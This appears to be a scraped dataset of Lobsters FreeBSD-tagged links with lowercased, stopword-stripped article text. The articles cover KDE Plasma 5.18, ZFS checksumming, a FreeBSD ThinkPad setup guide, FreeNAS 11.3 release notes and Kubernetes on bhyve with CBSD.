158,Lobsters,freebsd,FreeBSD,KDE Plasma 5.18 LTS - More Convenient and with Long Term Stability,https://kde.org/announcements/plasma-5.18.0.php,kde plasma lts convenient long term stability,english català español euskara italiano português português brasileiro русский slovak українська plasma notification system setting discover new since lts full plasma changelog supporting kde free software supporting kde page join game kde press contact,also available english català español euskara italiano português português brasileiro русский slovak українська kde plasma tuesday february plasma lts brand new version plasma desktop available plasma find neat new feature make notification clearer setting streamlined overall look attractive plasma easier fun use time allowing productive time work apart cool new stuff plasma also come lts status lts stand long term support mean updated maintained kde contributor next two year regular version maintained month thinking updating migrating school company organization plasma version best bet get stable version plasma new feature plasma plasma even userfriendly added feature let work play express better take new emoji selector literally always two keystroke away hold meta window key press period pop click icon best represents feeling paste emoji email social medium post text message even terminal emoji selector also find emoji finder kickoff application launcher main menu button usually located bottom lefthand corner screen look application utility another big change new global edit mode old desktop toolbox menu used live default top right corner screen gone leaving roomier tidier desktop instead introducing global edit bar activate rightclicking empty area desktop choosing customize layout popup menu global edit bar appears across top screen give access widget activity extra workspace set separately regular virtual desktop desktop configuration set option new global edit mode continuing improvement overall look plasma come better support gtk application using clientside decoration application show proper shadow resize area gtk apps also automatically inherit plasma setting font icon mouse cursor help relax eyesight new system tray widget let toggle night color feature also configure keyboard shortcut turn night color disturb mode night color widget still system tray audio volume system widget sport compact design make easier choose default audio device also clickable volume indicator apps shown task manager playing audio perapplication mute button task manager much subtle detail help make plasma look feel smoother slicker include tweak weather widget let view wind condition detail kickoff application launcher touchfriendly show user icon circular instead square notification new rounded smoother plasma look also arrived timeout indicator notification also circular surround close button making compact modern look change notification aesthetic plasma show notification connected bluetooth device run power notification also add interactivity capability file downloaded notification come draggable icon quickly drag file downloaded want keep drag drop file notification system setting quite new thing plasma system setting first foremost optional user feedback setting disabled default protect privacy said decide share information installation u none option allows system send kind personal information fact feedback setting slider let decide much want share kde developer kde developer later use information improve plasma better adapt need user feedback setting talking adapting plasma famous anything flexibility tweaked taste made process customizing desktop even pleasant redesigning application style setting grid view make easier see application look like pick favorite style application style setting grid view look big preview extended many area system setting search new theme download global theme appreciate different design glory global theme get hot new stuff another visual aspect tweak animation window added slider general behavior pull way right window pop existence instantaneously drag way left sloooowly emerge task bar advice go goldilocks option leave somewhere middle provides enough visual cue see happening slow make drag use find option overwhelming nt worry system setting search function much improved help find feature want change quickly start typing box top list unrelated option disappear leaving list exactly looking discover discover plasma visual software manager discover install remove update application library click open discover plasma cursor search field inviting immediately start looking program want install application find also search addons plasma theme splash screen cursor set read comment package user written find others think plasma discover finally improved overall performance plasma graphic hardware decreased amount visual glitch apps using fractional scaling also included nvidia gpu stats ksysguard new since lts upgrading previous long term support release plasma highlight last two year development completely rewritten notification system browser integration redesigned system setting page either using consistent grid view overhauled interface gtk application respect setting use kde color scheme shadow support global menu display management improvement including new osd widget flatpak portal support night color feature thunderbolt device management full plasma changelog supporting kde kde free software community exists grows help many volunteer donate time effort kde always looking new volunteer contribution whether help coding bug fixing reporting writing documentation translation promotion money etc contribution gratefully appreciated eagerly accepted please read supporting kde page information become kde ev supporting member join game initiative kde kde international technology team creates free open source software desktop portable computing among kde product modern desktop system linux unix platform comprehensive office productivity groupware suite hundred software title many category including internet web application multimedia entertainment educational graphic software development kde software translated language built ease use modern accessibility principle mind kde fullfeatured application run natively linux bsd solaris window macos trademark notice k desktop logo registered trademark kde ev linux registered trademark linus torvalds unix registered trademark open group united state country trademark copyright referred announcement property respective owner press contact information send u email press kdeorg
159,Lobsters,freebsd,FreeBSD,Checksumming in Filesystems and Why ZFS is Doing It Right,https://oshogbo.vexillium.org/blog/73/,checksumming filesystems zfs right,bibliography,one best aspect zfs reliability accomplished using feature like copyonwrite approach checksumming today look zfs checksumming proper way file system provide integrity checking fail several scenario data bit flip data wanted store bit flipped hard drive cable wrong data stored hard drive misdirected writes cpucablehard drive bit flip block data written misdirected read miss reading block bit flip occurred phantom writes write operation never made disk example disk kernel may bug return success even hard drive never made write problem also occur data kept hard drive cache checksumming may help u detect error situation jumping zfs let look checksumming could implemented simpler manner problem address nt example use netapp writeanywherefilelayout wafl feature called block checksum bcs bcs hard drive formatted byte per sector instead standard byte additional byte used checksumming operating system still saw disk byte per sector disk data sector read wafl verified checksum approach help detect data bit flip wrong data read written disk checksum allows u verify problem unfortunately approach nt solve sector read different place checksum also read place unable detect misdirected read data misdirected phantom write hard drive pretend data data stored way detect behavior structure bcs approach better checksumming solves one issue data bit flip zfs like always decided go different approach structure zfs using called merkle tree node checksum child node image little bit simplified give idea data organized zfs checksum block stored block data instead stored node go uber block keep checksum leaf quite simplified uber block keep one checksum object set keep checksum rest dnodes thanks detect data bit flip checksum match stored data also detect misdirected read bit flip offset checksum match read data data read wrong offset checksum right one way around partial phantom read checksum match stored data misdirected write data match checksum see using merkle tree safe way store data disk allows u detect lot problem system also worth noting zfs configured redundant way detect broken data return correct data course possible also repair feature called selfhealing bibliography
160,Lobsters,freebsd,FreeBSD,FreeNAS versus Unraid - Grudge Match,https://www.youtube.com/watch?v=aXsRIrC5bjg,freenas versus unraid grudge match,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature freenas v unraid grudge match youtube,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature freenas v unraid grudge match youtube
161,Lobsters,freebsd,FreeBSD,ThinkPad T480 is My New Main Laptop which Runs FreeBSD,https://genneko.github.io/playing-with-bsd/hardware/freebsd-on-thinkpad-t480/,thinkpad new main laptop run freebsd,thinkpad new main laptop run freebsd laptop spec work jitsi meet jitsimeet port available initial setup disable secure boot tpm bluetooth http http version install o installation basic configuration first boot setting grahpical desktop environment personal note setup touchpad trackpoint http benrowangithubiopostdisablelenovotrackpad suspendresume http screen brightness beep logout epson inkjet printer audacity joplin http joplinapporg onedrive http githubcomabrauneggonedrive wine http wikiwinehqorgfreebsd http http bhyve failover ethernet wifi burning cd webcam video conferencing reference revision history,thinkpad new main laptop run freebsd using freebsd primary server o quite long time unknown reason never seriously used client workstation maybe partly cuioriented person love thing text terminal much possible actually pretty happy client o long could use decent terminal could ssh freebsd server spent lot time job require graphical interface however also true wishing freebsd desktop allows everything web browsing text editing single machine started research freebsd laptop midst year longerthanusual rainy season gathering information web tried various gui setup vms bought new laptop lenovo thinkpad experimenting finally got fully working freebsd laptop daily use rainy season proven really great machine running freebsd write article share something anyone look similar experience laptop spec generally speaking love small machine low power consumption time goal replacing main desktop running window new laptop invested performance much usual cpu core boosted thread tdp ram sodimm storage samsung evo sata ssd originally laptop came seagate sata vga integrated intel uhd graphic ethernet intel ethernet connection onboard wifi intel dual band wirelessac ac bt fingerprint smartcard reader work freebsd xorg get following stuff working ethernet wifi work although wifi bit slow compared capable os xorg work fine full resolution suspendresume work almost fine level window sometimes get weird anyway sound output work speaker headphone microphone seems work audacity google hangout mute button work volume button work adjust volume ui lcd brightness button work sd card reader seems work dosformatted sd card mounted read usual filesystems window program run wine window run bhyve purchase amazon music etc lagg failover ethernet wifi work use ethernet available otherwise use wifi webcam work chromium firefox pwcview webcamd cuseko used video conferencing jitsi meet private jitsimeet port available instance tested following item bluetooth disabled bios avoid hang reboot initial setup disable secure boot tpm bluetooth boot freebsd installation medium enter bios menu disable secure boot tpm also required disable bluetooth avoid hangup system reboot http enter setup menu startup press enter lenovo logo screen loud beep suppressed turn mute button http enter bios setup menu press change following setting press save exit security secure boot secure boot enabled disabled security security chip security chip enabled disabled security io port access bluetooth enabled disabled look like memstick installer support uefi boot left startup page uefilegacy boot csm support untouched uefi respectively version install first selected following freebsd version candidate freebsd freebsd freebsd expert advice twitter experiment actual machine installation medium ram disk maybe another post chose start turn right choice based right advice o installation almost nothing special installation thing note boot usb stick memstickimg press enter enter boot menu select usb hdd boot distribution set selected kerneldbg addition implicit base kernel wine filesystem course chose zfs specify gpt uefi partitioning scheme created swap partition mostly crash dump space setup wifi interface system service enable moused ntpd powerd disable sshd put user account secondary group wheel operator video exiting installer manually renamed zfs dataset home directory usual rm home zfs rename zrootusrhome zroothome zfs set mountpointhome zroothome exit basic configuration first boot first boot logged performed following usual configuration update o su freebsdupdate fetch install shutdown r install basic package usually install nonx lite version available time selected full version su pkg update pkg install git vim tmux bash sudo rsync jankf zfsstats portmaster configure sudoers visudo configure user preference dotfiles setting grahpical desktop environment completely new graphical desktop world inevitable learn thing one one lot trial error anyway use following component build desktop xorg display server slim login manager xfce desktop environment plus list graphical application daily use terminal emulator firefox chromium web browser thunderbird email client joplin note taking application evernote alternative rhythmbox jukebox vlc medium player medium player gimp image editor inkscape drawing tool audacity audio editor handbrake video transcoder window application picture organizer run wine setup process follows install graphic driver reboot system sudo pkg install drmkmod sudo sysrc kldlist shutdown r install xorg releated package sudo pkg install xorg xfce slim slimthemes install local language stuff sudo pkg install japanesefontstd japanesefontvlgothic japanesefonttakao jafcitxmozc jafcitxskk zhfcitxconfigtool create xinitrc lot language configuration please ignore need binsh xinitrc locale export export export input method fcitxmozc export gtkimmodulefcitx export qtimmodulefcitx export xmodifiers imfcitx start input method usrlocalbinmozc start fcitx r disable beep xset b start exec configure start service brings graphical login manager sudo sysrc dbusenableyes sudo sysrc haldenableyes sudo sysrc polkitdenableyes sudo sysrc avahidaemonenableyes sudo sysrc avahidnsconfdenableyes sudo sysrc slimenableyes sudo service dbus start sudo service hald start sudo service avahidaemon start sudo service avahidnsconfd start sudo service slim start install application sudo pkg install firefox thunderbird chromium personal note setup touchpad trackpoint http benrowangithubiopostdisablelenovotrackpad suspendresume able perform suspendresume running acpiconf logout dialog almost box point realized following behavior logout dialog login first time system boot dialog show logout reboot shutdown suspend hibernate work fine thought last one supported o tried suspended system resume login system logging dialog show logout active state option grayed displayed struggle solved creating following polkit rule file eg directory http note use configuration user account operator group installation mentioned earlier pkg info always able shutdown reboot system add rule file directory look like replace putyourgrouphere group polkitaddrule function action subject actionid orgfreedesktopconsolekitsystemrestart actionid orgfreedesktopconsolekitsystemstop subjectisingroup operator return polkitresultyes working suspendresume polkitaddrule function action subject actionid orgfreedesktopconsolekitsystemsuspend subjectisingroup operator return polkitresultyes explicitly disallow hibernation supported o polkitaddrule function action subject actionid orgfreedesktopconsolekitsystemhibernate return polkitresultno suspendresume seems work reliably command lid closeopen logout dialog screen brightness beep logout unmute opening logout dialog make loud beep added following line xinitrc avoid xset b epson inkjet printer install configure cup follows point web browser configure printer sudo pkg install gutenprint sudo sysrc cupsdenableyes sudo service cupsd start package seem support cup support lpd audacity export install lame port audacity installed via binary package joplin http joplinapporg onedrive http githubcomabrauneggonedrive previous main pc window used onedrive import photo taken uploaded smartphones onedrive free client allows achieve freebsd machine sudo pkg install onedrive onedrive open url shown sign microsoft account see blank page granting access onedrive free client enter blank page url commandline prompt test onedrive default syncdir onedrive downloadonly dryrun synchronize real run onedrive downloadonly synchronize wine http wikiwinehqorgfreebsd http http install time chose devel sudo pkg install winegeckodevel winemonodevel winetricks run irfanview yamaha mid radio player bhyve maybe another post failover ethernet wifi advice freebsd forum twitter finally got lagg failover ethernet wireless interface working freebsd handbook configuration etcrcconf follows ether wifi mac address wpa country jp clonedinterfaces laggproto failover laggport laggport dhcp opposed handbook example use wifi mac address ethernet interface essentially handbook also tried ethernet mac wifi worked first ran problem reboot system configuration ethernet member port wifi interface seemed created lagg initially configured manually running service netif restart lagg failover begin work wondered avoid manual intervention discussion forum quickly solved problem suggests loading wifirelated kernel modueles loader instead devd achieved adding following line bootloaderconf reboot ifiwmload yes yes made detected much earlier successfully configured member boot got another suggestion twitter better load module required boot rc loader moved bootloaderconf etcrcconf confirmed also worked expected kldlist ifiwm previously mentioned graphic burning cd burnt cd long time recently asked create audio cd plugged usb cdrrw drive laptop tried freebsd found system already guibased xfburn brasero addition cdrecord good old commandline burner program first tried guibased one said burner found hurry time used cdrecord root first time year check cd drive device number sudo cdrecord scanbus buffalo optical drive removable cdrom burn sudo cdrecord v pad dao musicwav running cdrecord root privilege could burn cd obvious device permission kept gui burner run normal user finding burner following ownermode user account normal user operator group could read device write crwr root operator nov adjusted device permission devfs add following devfs ruleset etcdevfsrules added pas xpt adding work add path group operator mode add path group operator mode add path group operator mode maybe could cd pas xpt use former following output camcontrol devlist samsung ssd evo target lun buffalo optical drive target lun generic sdmmc target lun add line etcrcconf use devfs ruleset devfssystemruleset devfsrulescdwriter reboot system burn cd gui program webcam video conferencing added pleasant surprise find jitsi video conference using firefoxchromium work help cuseko webcamd install webcamd sudo pkg install webcamd add user webcamd group sudo pw groupmod webcamd genneko configure cuse kernel module loaded boot sudo sysrc kldlistcuse configure webcamd started boot sudo sysrc webcamdenableyes sudo service webcamd enable manually load module restart devd start service reboot entire system sudo kldload cuse sudo service devd restart sudo shutdown r reference revision history created added failover ethernet wifi added suspendresume updated onedrive free client url added burning cd added webcam video conferencing
163,Lobsters,freebsd,FreeBSD,Remove sparc64 kernel support,https://svnweb.freebsd.org/base?view=revision&revision=357455,remove kernel support,headliblibkvmmakefile modified text changed headsysmakefile modified text changed headsyscamcamxptc modified text changed headsyscddlcompatopensolarissysatomich modified text changed modified text changed headsyscddlcontribopensolarisutscommonsysasmlinkageh modified text changed deleted headsysconfnotes modified text changed headsysconffiles modified text changed deleted headsysconfkernmk modified text changed headsysconfkernoptsmk modified text changed deleted deleted headsyscontribckincludeckmdh modified text changed headsysdevataatapcic modified text changed headsysdevatachipsetsatapromisec modified text changed headsysdevatkbdcatkbdc modified text changed headsysdevatkbdcatkbdcc modified text changed headsysdevatkbdcatkbdcebusc deleted headsysdevauxioauxioc deleted headsysdevauxioauxioregh deleted headsysdevbgeifbgec modified text changed headsysdevcasifcasc modified text changed headsysdevdcifdcc modified text changed headsysdevespespsbusc deleted headsysdevfbcreatorc deleted headsysdevfbcreatorvtc deleted headsysdevfbcreatorregh deleted headsysdevfbfbregh modified text changed headsysdevfbmachfbc deleted headsysdevfbmachfbregh deleted headsysdevfirewiresbpc modified text changed headsysdevgemifgempcic modified text changed headsysdevgemifgemsbusc deleted headsysdevhmeifhmepcic modified text changed headsysdevhmeifhmesbusc deleted deleted headsysdevispispfreebsdh modified text changed headsysdevispisppcic modified text changed headsysdevispispsbusc deleted deleted headsysdevispfwispfwc modified text changed headsysdevleiflelebufferc deleted headsysdevleifleledmac deleted headsysdevlelebuffersbusc deleted headsysdevmptmpth modified text changed headsysdevmptmptpcic modified text changed headsysdevmthcamthcasrqc modified text changed headsysdevmxgeifmxgevarh modified text changed headsysdevofwopenfirmh modified text changed headsysdevpcfenvctrlc deleted headsysdevpcfpcfebusc deleted headsysdevprotoprotocorec modified text changed headsysdevsccsccbfeebusc deleted headsysdevsccsccbfesbusc deleted headsysdevsfxgecommonefsysh modified text changed modified text changed headsysdevsoundsbusapcdmaregh deleted deleted deleted headsysdevsymsymhipdc modified text changed headsysdevsysconsscgfbrndrc modified text changed headsysdevsysconsschistoryc modified text changed headsysdevsysconssctermdumbc modified text changed headsysdevsysconssctermscc modified text changed headsysdevsysconssctermtekenc modified text changed headsysdevsysconsscvtbc modified text changed headsysdevsysconssysconsc modified text changed headsysdevsysconssysconsh modified text changed headsysdevuartuartbusebusc deleted deleted headsysdevuartuartkbdsunc deleted headsysdevuartuartkbdsunh deleted headsysdevuartuartkbdsuntablesh deleted headsysdevvthwfbvtearlyfbc modified text changed headsysdevvthwofwfbofwfbc modified text changed headsyskernkernexitc modified text changed headsyskernkernmallocc modified text changed headsyskernsubrparamc modified text changed headsyskernsubruioc modified text changed headsyskernsubrwitnessc modified text changed headsysmodulesmakefile modified text changed headsysmodulesauxiomakefile deleted headsysmodulesbgemakefile modified text changed headsysmodulescasmakefile modified text changed headsysmodulesepicmakefile deleted headsysmodulesespmakefile modified text changed headsysmodulesgemmakefile modified text changed headsysmoduleshmemakefile modified text changed headsysmoduleshwpmcmakefile modified text changed modified text changed headsysmodulesispmakefile modified text changed headsysmodulesispfwmakefile modified text changed headsysmoduleslemakefile modified text changed headsysmodulessccmakefile modified text changed headsysmodulessounddrivermakefile modified text changed headsysmodulessounddriveraudiocsmakefile deleted headsysmodulessysconsmakefile modified text changed headsysmodulesuartmakefile modified text changed,headliblibkvmmakefile modified text changed headsysmakefile modified text changed headsyscamcamxptc modified text changed headsyscddlcompatopensolarissysatomich modified text changed modified text changed headsyscddlcontribopensolarisutscommonsysasmlinkageh modified text changed deleted headsysconfnotes modified text changed headsysconffiles modified text changed deleted headsysconfkernmk modified text changed headsysconfkernoptsmk modified text changed deleted deleted headsyscontribckincludeckmdh modified text changed headsysdevataatapcic modified text changed headsysdevatachipsetsatapromisec modified text changed headsysdevatkbdcatkbdc modified text changed headsysdevatkbdcatkbdcc modified text changed headsysdevatkbdcatkbdcebusc deleted headsysdevauxioauxioc deleted headsysdevauxioauxioregh deleted headsysdevbgeifbgec modified text changed headsysdevcasifcasc modified text changed headsysdevdcifdcc modified text changed headsysdevespespsbusc deleted headsysdevfbcreatorc deleted headsysdevfbcreatorvtc deleted headsysdevfbcreatorregh deleted headsysdevfbfbregh modified text changed headsysdevfbmachfbc deleted headsysdevfbmachfbregh deleted headsysdevfirewiresbpc modified text changed headsysdevgemifgempcic modified text changed headsysdevgemifgemsbusc deleted headsysdevhmeifhmepcic modified text changed headsysdevhmeifhmesbusc deleted deleted headsysdevispispfreebsdh modified text changed headsysdevispisppcic modified text changed headsysdevispispsbusc deleted deleted headsysdevispfwispfwc modified text changed headsysdevleiflelebufferc deleted headsysdevleifleledmac deleted headsysdevlelebuffersbusc deleted headsysdevmptmpth modified text changed headsysdevmptmptpcic modified text changed headsysdevmthcamthcasrqc modified text changed headsysdevmxgeifmxgevarh modified text changed headsysdevofwopenfirmh modified text changed headsysdevpcfenvctrlc deleted headsysdevpcfpcfebusc deleted headsysdevprotoprotocorec modified text changed headsysdevsccsccbfeebusc deleted headsysdevsccsccbfesbusc deleted headsysdevsfxgecommonefsysh modified text changed modified text changed headsysdevsoundsbusapcdmaregh deleted deleted deleted headsysdevsymsymhipdc modified text changed headsysdevsysconsscgfbrndrc modified text changed headsysdevsysconsschistoryc modified text changed headsysdevsysconssctermdumbc modified text changed headsysdevsysconssctermscc modified text changed headsysdevsysconssctermtekenc modified text changed headsysdevsysconsscvtbc modified text changed headsysdevsysconssysconsc modified text changed headsysdevsysconssysconsh modified text changed headsysdevuartuartbusebusc deleted deleted headsysdevuartuartkbdsunc deleted headsysdevuartuartkbdsunh deleted headsysdevuartuartkbdsuntablesh deleted headsysdevvthwfbvtearlyfbc modified text changed headsysdevvthwofwfbofwfbc modified text changed headsyskernkernexitc modified text changed headsyskernkernmallocc modified text changed headsyskernsubrparamc modified text changed headsyskernsubruioc modified text changed headsyskernsubrwitnessc modified text changed headsysmodulesmakefile modified text changed headsysmodulesauxiomakefile deleted headsysmodulesbgemakefile modified text changed headsysmodulescasmakefile modified text changed headsysmodulesepicmakefile deleted headsysmodulesespmakefile modified text changed headsysmodulesgemmakefile modified text changed headsysmoduleshmemakefile modified text changed headsysmoduleshwpmcmakefile modified text changed modified text changed headsysmodulesispmakefile modified text changed headsysmodulesispfwmakefile modified text changed headsysmoduleslemakefile modified text changed headsysmodulessccmakefile modified text changed headsysmodulessounddrivermakefile modified text changed headsysmodulessounddriveraudiocsmakefile deleted headsysmodulessysconsmakefile modified text changed headsysmodulesuartmakefile modified text changed
164,Lobsters,freebsd,FreeBSD,HardenedBSD Tor Onion Service v3 Nodes,https://hardenedbsd.org/article/shawn-webb/2020-01-30/hardenedbsd-tor-onion-service-v3-nodes ,hardenedbsd tor onion service node,http,working today deploying tor onion service node across build infrastructure happy announce public portion completed find various onion service hostnames match infrastructure hardenedbsdorg gpgsigned version post http
166,Lobsters,freebsd,FreeBSD,FreeNAS 11.3-RELEASE Available,https://www.ixsystems.com/blog/library/freenas-11-3-release/,freenas available,please read release note thoroughly updating http jiraixsystemscomprojectsnas http wwwfreenasorgdownload major new feature improvement community plugins greatly improved updating migrating existing domain controller known impact full feature note automatic certificate management environment acme amazon route new feature deprecated removed feature truecommand migrating existing domain controller known issue known impact backblaze lifecycle rule migrating existing domain controller instruction transfer fsmo role demote,pleased announce general availability freenas series represents yearlong development effort brings wide variety improvement fix please read release note thoroughly updating become familiar potential impact many new feature brought update please report bug http jiraixsystemscomprojectsnas install release refer http wwwfreenasorgdownload installation instruction download installation file major new feature improvement freenas includes many new feature improvement following highlight reimplemented replication engine allows replication speed improvement resume support failed transfer well ability replicate locally acl manager allows setup management smb acl directly via freenas web interface smb shadow copy enabled default new share note snapshot show window previous version tab snapshot used size show change file repository community plugins created user create distribute party plugins officially ixsystems supported updated translation czech french japanese russian simplified chinese additionally process add additional translation greatly improved iscsi wizard streamlines process creating new iscsi target click alert system overhaul granular alert well control set alert threshold dashboard update initial dashboard show live view system status including network traffic cpu memory utilization nat support plugins eliminates need plugin dedicated ip address network full featured api includes rest websocket connection allowing freenas fully scripted driven via api used webinterface large pool creation assistance creating zfs pool large number disk ui provides automated way repeat vdev layout across remaining disk zfs performance optimization across board many different workload updating updating existing freenas system user currently series first update reduce amount migration needed ensure release train correctly updated warden jail exist system take time recreate plugins us iocage backend test working expected freenas system domain controller network follow instruction migrating existing domain controller verify domain working correctly backup configuration using system general save config sure select export password secret seed configured iscsi active directory cloud service replication configured also backup usrlocaletcssh rootssh directory select train dropdown train menu recommended also doublecheck known impact section postinstallation instruction particularly smb share time machine backup note upgrading prereleases ie need select correct train applying update full feature note replication framework redesigned adding new backend system file screen option replication system periodic snapshot task redesign add feature new peerscredentials api creating managing credential ssh connection ssh keypairs screen added wizard make easy generate new keypairs existing sftp ssh replication key created earlier automatically added entry ssh keypairs upgrade new transport api add netcat support greatly improved speed transfer snapshot creation decoupled replication task allowing replication manually created snapshot ability use custom name snapshot configurable snapshot retention remote side new replication wizard make easy configure replication scenario including local replication replication system running legacy replication replication resumable failed replication task automatically try resume previous checkpoint task log accessed state column network interface management redesigned streamline management physical virtual interface using one screen vlans laggs classified interface type support bridge interface type added addressing detail physical interface including dhcp displayed readonly interface member lagg applying interface change web interface provides window cancel change revert previous network configuration new mtu field make easier set mtu longer typed auxiliary parameter automatic certificate management environment acme support added acme simplifies process issuing renewing certificate using set dns challenge verify user owner domain new api support addition multiple dns authenticator support amazon route added initial implementation acme dns screen used authenticator configuration add acme certificate option certificate signing request configured freenas automatically renew acme certificate expire alert system improved support oneshot critical alert added alert remain active dismissed user alert setting reorganized alert grouped functionally rather alphabetically peralert severity alert threshold configurable periodic alert script replaced alert framework periodic alert email disabled default previous email alert condition added freenas alert system email alert method configured alert service dashboard rewritten provide overview current state system rather repeat historical data found reporting us middleware handle data collection provide web interface realtime event line chart replaced meter gauge cpu graph consolidated single widget provides average usage perthread statistic temperature usage interface represented separate card per physical nic unless part lagg card pool interface widget feature mobileinspired lateral navigation allowing user drill data without leaving page reporting greatly improved data prepared backend middleware operating system remaining data manipulation done web worker keeping expensive processing main ui threadcontext svgbased charting library replaced gpuaccelerated canvasbased library virtual scroll lazy loading prevent overloading browser eliminate need pager user zoom x axis reset zoom level double click graph display related data support ups nfs statistic added option configuring reporting database moved system reporting screen add ability configure graph age well number point hourly daily weekly monthly yearly graph graph point location reporting database default tmpfs configurable alert database exceeds gib added alert setting web interface received many improvement bug fix usability enhancement include ability move pin copy help text persistent layout customizations customizable column view size unit accept humanized input improved caching browser support improved error message popup dialog help text ix official theme added default new installation nat support added default plugins nat plugin contained network require knowledge physical network work properly remove need manually configure ip address dhcp server running installing plugin virtualized environment nat remove requirement enable promiscuous mode network plugins page streamlined operation performed without go jail page support collection added differentiate ixsystems plugins receive update every week community plugins addition many bug fix improvement iocage plugins backend resulting much better plugins user experience acl manager added storage pool option permission editor redesigned new iscsi wizard make easy configure iscsi share several pool manager improvement label tooltips encryption operation clearer disk type rotation rate manufacturer information make easier differentiate selectable disk creating pool repeat button make easy create large pool using vdev layout series striped mirror support collecting daily anonymous usage statistic added collected nonidentifying data includes hardware information cpu type number size disk configured nic type well indication service type share plugins configured collected data assist determining best focus engineering testing effort collection enabled default optout unset system general usage collection significant improvement smb sharing include zfs user quota support web service discovery support improved directory listing performance newlycreated share middleware websockets rewrite complete remains backwards compatibility deprecated longer available next major release complete list new feature change ui found new feature section guide deprecated removed feature legacy web interface removed longer appears option login screen warden removed along support warden jail plugins installed using freenas earlier netdata removed service due longstanding upstream memory leak truecommand provides similar reporting plus advanced management capability single multiple freenas system free use manage drive builtin docker template removed though docker still deployed linux virtual machine domain controller removed service migrate existing domain controller configuration follow step migrating existing domain controller updating hipchat removed deprecated upstream known issue user updating may see production release warning update safely ignored disappear update complete known impact system longer allows moving system dataset encrypted pool containing passphrase since directory service smb state information stored system dataset service function correctly system dataset locked otherwise unavailable recommended move system dataset nonencrypted pool encrypted pool containing passphrase syncing bucket delete file bucket even file deleted locally instead file tagged version number moved hidden state automatically delete old unwanted file bucket adjust backblaze lifecycle rule time machine smb share configured using auxiliary parameter backup may fail since middleware performs smb afpovertcp adisk mdns registration smb share auxiliary parameter longer evaluated determine whether advertise time machine resolve remove fruit time machine yes check time machine box smb share run command midclt call mdnsadvertiserestart default mode changed special simple change recommended synchronizes samba default provides better user experience legacy behavior required add following auxiliary parameter smb share modespecial important share mode setting share common caching backend sid id lookup sambaserver rc script broken separate rc script sambarelated service manually invoke script add one prefix rc command samba server onerestart restart desired service directly service winbindd restart legacy ad monitoring replaced following health check hourly clock skew check dc pdc emulator fsmo role test connection netlogon share currently connected dc every minute instantaneous alert winbindd status domain transitioning offline alert automatically cleared domain come back online existing smb share migrated use new libzfsbased shadow copy module default new smb share shadow copy enabled zfs snapshot visible previous version file explorer disable behavior uncheck enable shadow copy checkbox smb share two share type choice dataset creation smb case insensitive dataset filesystem case insensitive case preserving restricted aclmode chmod permitted default restricted acl generic case sensitive dataset passthrough aclmode chmod allowed default acl smb selected share type default acl applied dataset since case sensitivity setting immutable user consider applicationclient requirement prior selecting smb share type migrating existing domain controller freenas system currently configured domain controller dc network follow step transfer domain role separate system running samba act new dc freenas system take snapshot dataset containing sysvol share make clone current boot environment install samba new server prepare join existing domain follow instruction set freenas dc nameserver new samba dc join new samba dc existing domain sambatool domain join samdomfun dc u samdomadministrator view location current fsmo role sambatool fsmo show transfer fsmo role freenas samba server sambatool fsmo transfer roleall u samdomadministrator demote freenas sambatool domain demote u samdomadministrator snapshot state disable domain controller service freenas clear dc configuration
167,Lobsters,freebsd,FreeBSD,Meet FuryBSD: A New Desktop BSD Distribution,https://itsfoss.com/furybsd/,meet furybsd new desktop bsd distribution,please log,session expiredplease log login page open new tab logging close return page
168,Lobsters,freebsd,FreeBSD,Deploy Kubernetes Cluster on FreeBSD Bhyve (CBSD),https://www.bsdstore.ru/en/articles/cbsd_k8s_part1.html,deploy kubernetes cluster freebsd bhyve cbsd,kubernetes linux freebsd o bhyve hypervisor cbsd cbsd integrates easily cbsd project http apt install kubeadm cbsd cbsd cbsd cbsd help cbsd cbsd taskls cbsd bconstructtui cbsd bls cbsd cbsd cbsd bremove enjoy http ceph nfs object storage,recently new job colleague noted nonstandard success story company completely got rid docker two hundred container little something yes yes although trend going ten year dedockerization process brought lot joy relief although temporarily talk pro con docker remind wellknown truth nothing perfect always tool implementation solution suitable addition field single right way always option area fascinating point inside company came understanding docker used incorrectly brings problem solves fix department received task transferring business process rail microservice architecture developer must take account specific characteristic container approach question beyond scope article say new concept step taken imply u use container even larger scale application really ready connection question raised regarding orchestration large number container quite solution container orchestration popular famous highly advertised probably kubernetes since plan conduct many experiment installing configuring need laboratory quickly easily deploy cluster quantity work everyday life use two o tightly linux freebsd o kubernetes docker linuxcentric project first glance expect useful participation help freebsd saying go elephant made fly longer fly however two tempting thing come mind good integration work freebsd zfs file system would nice use snapshot mechanism cow reliability second bhyve hypervisor still need docker loader form linux kernel thus need connect certain number action various way related starting preconfiguring virtual machine typical linuxbased server freebsd exactly work hood run virtual machine play big role let take freebsd free time member cbsd project provide end user userfriendly interface managing container virtual machine freebsd platform another part user know cbsd framework thanks api integrates easily script automatically manage virtual infrastructure realizing operation low level working virtual machine thus task build kind bridge operation cluster task related deploying virtual machine work took hour turned working cbsd module publicly available starting next cbsd version like everything else related cbsd project let see got spoiler prefer watch video small demo youtube subtitle english http goal create small local laboratory working cluster server disposal following characteristic tb hard drive freebsd zfsonroot ram gb cpu intel r xeon r cpu core word shortage resource using ubuntu cloud image generated kubernetes cloud image differs ubuntu image connected kubernetes repository apt install kubeadm command executed deploying image immediately start working kubectl utility uploaded experimental image mirror cbsd project start virtual machine image standard cbsd dialog bconstructtui command first need choose type guest case guest linux next select name containing kubernetes list readymade linux profile cloud image look bottom list edit remaining parameter necessary example change network setting cloudinit helper editing parameter create virtual machine result got working virtual machine kubernetes already installed main feature cbsd kubernetes end focus task however already good thanks cloudinit need install o every time using installer need install kubernetes every time installing o need start vm gold image like manual work case second starting virtual machine continue since creating configuring also trivial task primarily lot monotonous monkey work form repeating large number identical command placed command separate script script received status module cbsd operation begin prefix name cbsd command display information required notso argument brief description help argument module offer small number operation including bootstrap join configuring receiving kubernetes token start operation strict order one another specify necessary argument one time module figure example execute command cbsd setup master node ask module complete entire cycle initializing one cluster export token working kubectl using cli remote machine cbsd module performs work various place parallel sequentially example script executed parallel module proceed next step need make sure recent slowest node completed configuration ready next step thus final step individual scenario expectation example observe fact parallelization progress internal task output cbsd taskls sooner later case within second module switched initial boot configuration phase one node assigned master role others become worker purpose bootstrap start virtual machine kubernetes golden image cbsd bconstructtui starting one virtual machine dialog interface thus within second started virtual machine observe output cbsd bls must say role cbsd launching virtual machine working cloudinit also automatically searching free name new container case kube mask used beginning container name searching automatically assigning free ip address system take cbsd node ip pool setting screenshot show ip address issued virtual machine always go sequentially already network configuration stage masterworker longest take minute come join stage take second life finally script exporting token succeeds since exported token working local machine work cluster directly freebsd host 